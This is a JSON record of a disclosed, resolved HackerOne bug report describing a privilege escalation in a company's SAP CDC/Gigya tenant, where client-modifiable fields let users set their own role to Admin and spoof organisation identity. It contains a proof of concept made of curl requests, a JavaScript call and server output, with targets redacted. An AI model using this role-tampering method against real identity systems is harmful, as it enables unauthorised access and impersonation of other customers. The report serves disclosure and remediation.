@@ -1,0 +1,133 @@
+{
+  "id": 3726887,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzI2ODg3",
+  "url": "https://hackerone.com/reports/3726887",
+  "title": "Privilege-relevant fields are clientModify in SAP CDC schema allowing role escalation to Admin",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-11T12:06:01.537Z",
+  "submitted_at": "2026-05-11T12:06:02.746Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "matty69v",
+    "url": "/matty69v",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/d9drin7bro3d44gr64nbpghu6pik/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 109248,
+    "url": "https://hackerone.com/essity",
+    "handle": "essity",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/wds9tsdw2rclypa3m596vwa57zq0/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Essity",
+      "twitter_handle": "",
+      "website": "http://essity.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-05-20T08:54:21.108Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-05-20T08:54:20.685Z",
+  "team_member_agreed_on_going_public_at": "2026-05-20T08:26:12.047Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\nThe Gigya / SAP CDC tenant fronting all four `████████.*` sites (████████) was configured with incorrect `writeAccess` permissions on role-and-billing-relevant fields. The full schema is returned unauthenticated by `accounts.getSchema`, and critical fields including `data.role`, `data.org.bpid`, `data.soldTo`, `data.crmId`, `data.orgName`, and others all carry `\"writeAccess\":\"clientModify\"`  meaning **any authenticated end-user can set them on their own account from the browser** via the public `accounts.████████` API.\n\nTwo of these fields —`data.role` and the per-org `data.org.roles.name`  are the exact fields the `████████.*` login flow reads to determine which authenticated session to issue. The inline login script on every locale executes `gigya.accounts.getAccountInfo` and reads the role from `groups.organizations[0].roles[0]`, then forwards the entire account info object (including user-modifiable `data` fields) to `/████████`.\n\n## Affected Fields with clientModify WriteAccess\n\n```\ndata.role                       data.org.bpid              data.org.roles.name\ndata.orgName                    data.orgEntered.orgName    data.orgEntered.duns\ndata.orgEntered.address.*       data.orgEntered.roles.name\ndata.crmId                      data.soldTo                data.defaultSoldTo\ndata.unit                       data.area                  data.level\ndata.deactivated                data.subscribe             data.terms\ndata.requestedCompanies         data.additionalCompany\nprofile.email                   profile.firstName          profile.lastName\nprofile.city / state / address / zip / country / work.title\n```\n\n## Steps To Reproduce\n\n### 1. Verify clientModify writeAccess (no authentication required)\n\n```bash\ncurl -sk -H \"X-HackerOne-Research: ████████\" \\\n     -X POST 'https://████████/accounts.getSchema' \\\n     --data-urlencode 'apiKey=████████' \\\n     --data-urlencode 'format=json' \\\n| python3 -c \"\nimport sys,json\nd = json.load(sys.stdin)\ncritical = ['role','org.bpid','orgName','crmId','soldTo','defaultSoldTo','unit','area','level','deactivated','org.roles.name']\nds = d['dataSchema']['fields']\nprint('field | writeAccess')\nfor f in critical:\n    if f in ds: print(f'  {f:25s} | {ds[f][\\\"writeAccess\\\"]}')\"\n```\n\n**Output:**\n```\nfield | writeAccess\n  role                      | clientModify\n  org.bpid                  | clientModify\n  orgName                   | clientModify\n  crmId                     | clientModify\n  soldTo                    | clientModify\n  defaultSoldTo             | clientModify\n  unit                      | clientModify\n  area                      | clientModify\n  level                     | clientModify\n  deactivated               | clientModify\n  org.roles.name            | clientModify\n```\n\n### 2. End-to-end PoC: Anonymous attacker becomes role: Admin\n\n**Step 1 - Initialize registration:**\n```bash\ncurl -sk -H \"X-HackerOne-Research: ████████\" \\\n     -X POST 'https://████████/accounts.initRegistration' \\\n     --data-urlencode 'apiKey=████████' \\\n     --data-urlencode 'format=json'\n# → regToken: ████████\n```\n\n**Step 2 - Register account:**\n```bash\ncurl -sk -H \"X-HackerOne-Research: ████████\" \\\n     -X POST 'https://████████/accounts.register' \\\n     --data-urlencode 'apiKey=████████' \\\n     --data-urlencode \"regToken=$REGTOK\" \\\n     --data-urlencode 'email=████████' \\\n     --data-urlencode 'password=████████' \\\n     --data-urlencode 'profile={\"firstName\":\"H1Research\",\"lastName\":\"████████-DO-NOT-APPROVE\"}' \\\n     --data-urlencode 'data={\"role\":\"User\",\"terms\":true,\"subscribe\":false}' \\\n     --data-urlencode 'finalizeRegistration=true' \\\n     --data-urlencode 'include=data,profile' \\\n     --data-urlencode 'format=json'\n# → UID: ████████, data.role: \"User\"\n```\n\n**Step 3 - Exploit: Overwrite role to Admin + billing identity:**\n```bash\ncurl -sk -H \"X-HackerOne-Research: ████████\" \\\n     -X POST 'https://████████/accounts.████████' \\\n     --data-urlencode 'apiKey=████████' \\\n     --data-urlencode \"regToken=$REGTOK\" \\\n     --data-urlencode 'data={\"role\":\"Admin\",\"soldTo\":\"9999999991\",\"crmId\":\"H1████████-CRM\",\"defaultSoldTo\":\"9999999991\",\"unit\":\"H1-RESEARCH\",\"area\":\"H1-RESEARCH\",\"level\":\"Admin\",\"deactivated\":false,\"orgName\":\"H1-████████-DO-NOT-APPROVE-ADMIN\"}' \\\n     --data-urlencode 'format=json'\n# → {\"errorCode\":0,\"statusCode\":200}\n```\n\n**Step 4 - Verify persistence:**\n```bash\ncurl -sk -H \"X-HackerOne-Research: ████████\" \\\n     -X POST 'https://████████/accounts.getAccountInfo' \\\n     --data-urlencode 'apiKey=████████' \\\n     --data-urlencode \"regToken=$REGTOK\" \\\n     --data-urlencode 'include=data,profile,groups,emails,id_token' \\\n     --data-urlencode 'format=json'\n```\n\n**Server response (abridged):**\n```json\n{\n  \"errorCode\":0,\n  \"UID\":\"████████\",\n  \"data\":{\n    \"role\":\"Admin\",\n    \"soldTo\":\"9999999991\",\n    \"defaultSoldTo\":\"9999999991\",\n    \"crmId\":\"H1████████-CRM\",\n    \"orgName\":\"H1-████████-DO-NOT-APPROVE-ADMIN\",\n    \"unit\":\"H1-RESEARCH\",\n    \"area\":\"H1-RESEARCH\",\n    \"level\":\"Admin\",\n    \"deactivated\":false\n  },\n  \"isActive\":true,\n  \"isRegistered\":true,\n  \"id_token\":\"████████\"\n}\n```\n\nEvery attacker-chosen value persisted server-side. The account is `isRegistered: true` and the server issued a signed Gigya FIDM JWT asserting the elevated identity.\n\n### 3. How clientModify enables exploitation\n\nBecause `writeAccess: clientModify` is set on `data.role` and related fields, any authenticated user can call:\n\n```js\ngigya.accounts.████████({\n    data: { \n        role: \"Admin\", \n        soldTo: \"999999991\", \n        bpid: \"999999991_0614_33_03\", \n        orgName: \"████████\" \n    }\n})\n```\n\nSAP CDC accepts the write. The ████████ login flow then reads these client-modified fields when calling `getAccountInfo` and uses them to determine session privileges via `/████████`.\n\n## Supporting Material/References\n\n- Test account UID: `████████`\n- Test email: `████████`\n- **Note for triage:** This test account was created in production strictly as PoC evidence. Please request the SAP CDC admin team to delete it.\n- Per SAP CDC documentation, fields used for authorization MUST be `serverOnly` or at most `clientRead`. `clientModify` on `data.role` is explicitly called out as a misconfiguration anti-pattern in SAP's hardening guide.\n\n## Impact\n\nAn authenticated attacker can escalate privileges to Admin role and impersonate other organizations on all four ████████).\n\n**Specific impacts:**\n\n1. **B2B Account Takeover / Role Escalation:** Any registered user can self-promote their `data.role` to \"Admin\" or any other privileged value the server recognizes, gaining unauthorized administrative access to the ████████ portal.\n\n2. **Cross-Customer Impersonation:** By spoofing `data.org.bpid`, `data.soldTo`, `data.crmId`, and `data.orgName`, an attacker can impersonate other organizations and access their sensitive business data, orders, and pricing information.\n\n3. **Deactivation Bypass:** Users can set `data.deactivated: false` to keep their accounts active even after back-office deactivation, circumventing security controls.\n\n4. **Consent/GDPR Violation:** Attackers can tamper with `data.subscribe` and `data.terms` fields to bypass marketing consent flags while maintaining account access, potentially causing GDPR compliance violations for the data controller.\n\n5. **Billing and Sales Territory Manipulation:** By modifying `data.unit`, `data.area`, and `data.level` fields, attackers can misrepresent their sales territory assignments and potentially manipulate pricing, routing, or order placement logic.\n\n6. **████████:** ████████:\n   - ████████\n   - ████████\n   - ████████`████████` ████████\n   - ████████ `████████`\n\nThe root cause is that SAP CDC schema configuration allows client-side modification of authorization-critical fields, violating the principle that authorization decisions must be based on server-controlled data only.",
+  "weakness": {
+    "id": 122,
+    "name": "Improper Privilege Management"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 7,
+  "voters": [
+    "qbit_",
+    "dpaysm",
+    "sqweezik",
+    "2026",
+    "matty69v",
+    "mohammadtayb",
+    "hasn0x"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.3,
+    "author_type": "User",
+    "cvss_4_point_0_metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "attack_requirements": "none",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "vulnerable_confidentiality": "high",
+      "vulnerable_integrity": "high",
+      "vulnerable_availability": "low",
+      "subsequent_confidentiality": "high",
+      "subsequent_integrity": "high",
+      "subsequent_availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 992258,
+    "asset_type": "URL",
+    "asset_identifier": "https://www.tenanet.it/",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
